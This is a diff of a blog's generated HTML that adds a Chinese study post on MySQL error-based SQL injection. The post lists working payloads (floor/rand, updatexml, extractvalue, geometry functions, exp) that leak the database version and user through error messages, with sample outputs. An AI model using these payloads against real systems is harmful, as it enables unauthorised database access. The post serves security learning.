@@ -6,15 +6,23 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives: 2019/1 | Wh1te</title>
+  <title>报错注入 tags： -学习 | Wh1te</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Wh1te">
-<meta property="og:url" content="http://yoursite.com/archives/2019/01/index.html">
+  <meta name="description" content="1.floor报错可以通过如下利用代码  and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a); and (select count() from (select 1 union select null union selec">
+<meta property="og:type" content="article">
+<meta property="og:title" content="报错注入 tags： -学习">
+<meta property="og:url" content="http://yoursite.com/2019/01/22/报错注入/index.html">
 <meta property="og:site_name" content="Wh1te">
+<meta property="og:description" content="1.floor报错可以通过如下利用代码  and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a); and (select count() from (select 1 union select null union selec">
 <meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-2b12a0a18a8648ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-b0c2a2f3230b5218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/15184404-a68c5bb43fa55749.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-01-22T12:35:49.898Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Wh1te">
+<meta name="twitter:title" content="报错注入 tags： -学习">
+<meta name="twitter:description" content="1.floor报错可以通过如下利用代码  and select 1 from (select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a); and (select count() from (select 1 union select null union selec">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/15184404-2b12a0a18a8648ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
   
     <link rel="alternative" href="/atom.xml" title="Wh1te" type="application/atom+xml">
   
@@ -164,353 +172,221 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-报错注入" class="article article-type-post " itemscope="" itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      报错注入 tags： -学习
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/22/报错注入/" class="archive-article-date">
+
+        
+        <a href="/2019/01/22/报错注入/" class="archive-article-date">
   	<time datetime="2019-01-22T07:47:08.389Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-22</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/22/报错注入/">报错注入 tags： -学习</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-floor报错"><a href="#1-floor报错" class="headerlink" title="1.floor报错"></a>1.floor报错</h1><p>可以通过如下利用代码</p>
+<ol>
+<li>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</li>
+<li>and (select count(<em>) from (select 1 union select null union select !1)x group by concat((select table_name from information_schema.tables limit 1),floor(rand(0)</em>2)));<br>###实例</li>
+</ol>
+<ul>
+<li>进行正常查询<br><img src="https://upload-images.jianshu.io/upload_images/15184404-2b12a0a18a8648ba.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></li>
+<li>该实例id输入存在注入，可以通过以下语句进行报错<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id = 1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>报错内容</p>
+<blockquote>
+<p>ERROR 1062 (23000): Duplicate entry ‘mysql版本号（如5.4.331）’ for key ‘group_key’</p>
+</blockquote>
+<h5 id="附"><a href="#附" class="headerlink" title="附"></a>附</h5><blockquote>
+<p>floor报错原理解释<br><a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">https://www.cnblogs.com/litlife/p/8472323.html</a></p>
+</blockquote>
+<h1 id="2-updatexml报错"><a href="#2-updatexml报错" class="headerlink" title="2.updatexml报错"></a>2.updatexml报错</h1><ul>
+<li>updataxml()函数<blockquote>
+<p>UPDATEXML (XML_document, XPath_string, new_value);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p>
+</blockquote>
+</li>
+</ul>
+<p>实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-b0c2a2f3230b5218.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>#####附</p>
+<blockquote>
+<p>updatexml报错原理解释<br><a href="https://www.cnblogs.com/xishaonian/p/6243497.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6243497.html</a><br>xpath语法：<a href="https://www.bbsmax.com/A/gVdnw4DzWl/" target="_blank" rel="noopener">https://www.bbsmax.com/A/gVdnw4DzWl/</a></p>
+</blockquote>
+<h1 id="3-extractvalue报错"><a href="#3-extractvalue报错" class="headerlink" title="3.extractvalue报错"></a>3.extractvalue报错</h1><ul>
+<li>extractvalue()函数<blockquote>
+<p>extractvalue()：从目标XML中返回包含所查询值的字符串。<br>　　EXTRACTVALUE (XML_document, XPath_string);<br>　　第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>　　第二个参数：XPath_string (Xpath格式的字符串)<br>　　concat:返回结果为连接参数产生的字符串。</p>
+</blockquote>
+</li>
+</ul>
+<p>实例<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/15184404-a68c5bb43fa55749.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>报错原理和updataxml相同</p>
+<h1 id="注：-以下报错方式暂时没遇见过，只是知道有这么个报错注入"><a href="#注：-以下报错方式暂时没遇见过，只是知道有这么个报错注入" class="headerlink" title="注： 以下报错方式暂时没遇见过，只是知道有这么个报错注入"></a>注： 以下报错方式暂时没遇见过，只是知道有这么个报错注入</h1><h1 id="4-geometrycollection报错"><a href="#4-geometrycollection报错" class="headerlink" title="4.geometrycollection报错"></a>4.geometrycollection报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and geometrycollection((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h1 id="5-multipoint报错"><a href="#5-multipoint报错" class="headerlink" title="5.multipoint报错"></a>5.multipoint报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and multipoint((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h1 id="6-polygon报错"><a href="#6-polygon报错" class="headerlink" title="6.polygon报错"></a>6.polygon报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and polygon((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h1 id="7-multipolygon报错"><a href="#7-multipolygon报错" class="headerlink" title="7.multipolygon报错"></a>7.multipolygon报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and multipolygon((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h1 id="8-linestring报错"><a href="#8-linestring报错" class="headerlink" title="8.linestring报错"></a>8.linestring报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and linestring((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h1 id="9-multilinestring报错"><a href="#9-multilinestring报错" class="headerlink" title="9.multilinestring报错"></a>9.multilinestring报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and multilinestring((select </em> from(select * from(select user())a)b));</p>
+</blockquote>
+<h1 id="10-exp报错"><a href="#10-exp报错" class="headerlink" title="10.exp报错"></a>10.exp报错</h1><blockquote>
+<p>select <em> from xxx where id=1 and exp(~(select </em> from(select user())a));</p>
+</blockquote>
+<h1 id="附-1"><a href="#附-1" class="headerlink" title="附"></a>附</h1><blockquote>
+<p>报错注入<br><a href="https://blog.csdn.net/liangdongjuan/article/details/78406395" target="_blank" rel="noopener">https://blog.csdn.net/liangdongjuan/article/details/78406395</a><br>报错注入原理分析<br><a href="http://blog.51cto.com/wt7315/1891458" target="_blank" rel="noopener">http://blog.51cto.com/wt7315/1891458</a></p>
+</blockquote>
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>救救孩子吧，孩子要吃土了<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/hongbao.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/01/22/报错注入/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/17/sqli-labs学习（lesson1-lesson20）/" class="archive-article-date">
-  	<time datetime="2019-01-17T14:42:33.030Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-17</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/01/17/sqli-labs学习（lesson1-lesson20）/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">sqli-labs学习（lesson1-lesson20）</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/17/sqli-labs学习（lesson1-lesson20）/">sqli-labs学习（lesson1-lesson20）</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">学习</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/16/写在开头/" class="archive-article-date">
-  	<time datetime="2019-01-15T17:09:48.945Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/16/写在开头/">第一篇博文</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">随笔</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/13/CTF Misic初接触/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:57:07.773Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/13/CTF Misic初接触/">CTF Misic初接触</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/13/CTF Crypto初接触/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:56:11.541Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/13/CTF Crypto初接触/">CTF Crypto初接触</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/13/CTF Web初尝试（ezsql，ereg2，买彩票吗）/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:54:24.770Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/13/CTF Web初尝试（ezsql，ereg2，买彩票吗）/">CTF Web初尝试（ezsql，ereg2，买彩票吗）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:52:25.707Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/13/CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）/">CTF Web初尝试（extract变量覆盖，php弱类型比较，ereg截断）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/13/CTF Web初尝试（签到题，Cookie）/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:50:08.396Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/13/CTF Web初尝试（签到题，Cookie）/">CTF Web初尝试（签到题，Cookie）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/01/13/CTF Web初体验（新人入坑，求大佬放过）/" class="archive-article-date">
-  	<time datetime="2019-01-13T15:44:00.889Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-01-13</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/01/13/CTF Web初体验（新人入坑，求大佬放过）/">CTF Web初体验（新人入坑，求大佬放过）</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -533,8 +409,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
